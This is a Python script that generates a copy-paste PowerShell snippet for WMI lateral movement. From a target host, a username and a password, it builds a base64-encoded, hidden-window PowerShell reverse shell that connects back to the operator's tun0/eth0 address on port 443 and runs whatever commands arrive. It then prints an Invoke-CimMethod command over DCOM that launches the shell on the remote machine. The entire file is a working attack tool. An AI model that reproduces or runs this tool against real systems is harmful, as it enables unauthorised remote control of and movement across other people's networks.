import argparse
import subprocess
import ipaddress
import base64


def get_local_ip():
    output = subprocess.run("ifconfig tun0 | grep 'inet ' | awk '{print $2}'", shell=True, capture_output=True).stdout.decode().strip()

    if len(output) == 0:
        print("could not retrieve IP from tun0... trying eth0")
        output = subprocess.run("ifconfig eth0 | grep 'inet ' | awk '{print $2}'", shell=True, capture_output=True).stdout.decode().strip()

        if len(output) == 0:
            print("Could not get local IP, please manually specify with -s [IP] [PORT]")
            exit()

    print(f"Got Local IP: {output}")
    return output


parser = argparse.ArgumentParser(description="creates a copy-paste for WMI lateral movement")
parser.add_argument("-n", "--node", required=True)
parser.add_argument("-u", "--user", required=True)
parser.add_argument("-p", "--password", required=True)
parser.add_argument("-s", "--power-shell", nargs=2, metavar=("IP_ADDRESS", "PORT"), default=[get_local_ip(), "443"])
args = parser.parse_args()


try:
    lhost = ipaddress.IPv4Address(args.power_shell[0])
except ipaddress.AddressValueError:
    print("Invalid IP address:", args.power_shell[0])
    exit()

try:
    lport = int(args.power_shell[1])
except ValueError:
    print("Invalid port number:", args.power_shell[1])
    exit()



print(f"Encoding shell with lhost={lhost} lport={lport}")
payload = '$client = New-Object System.Net.Sockets.TCPClient("'+str(lhost)+'",'+str(lport)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()


wmi_copy_paste_text = f'''
$secureString = ConvertTo-SecureString {str(args.password)} -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential {str(args.user)}, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName {str(args.node)} -Credential $credential -SessionOption $Options

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine ={str(cmd)}}}
'''


print("-" * 50)
print(wmi_copy_paste_text)
print("-" * 50)
